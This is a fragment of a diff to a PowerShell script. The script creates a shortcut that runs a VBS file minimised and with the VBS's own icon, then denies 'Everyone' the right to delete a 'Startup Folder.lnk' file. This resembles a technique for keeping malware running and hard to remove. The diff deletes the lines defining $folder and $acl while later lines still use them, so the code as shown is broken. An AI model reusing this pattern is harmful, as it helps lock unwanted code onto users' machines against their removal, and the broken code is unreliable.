@@ -11,8 +11,6 @@ $shortcut.Arguments = "`"$sourceVBS`""
 $shortcut.WindowStyle = 7
 $shortcut.IconLocation = "$sourceVBS, 0"
 $shortcut.Save()
-$folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
-$acl = Get-Acl $folder
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
 $acl.AddAccessRule($accessRule)
 Set-Acl -Path $folder -AclObject $acl
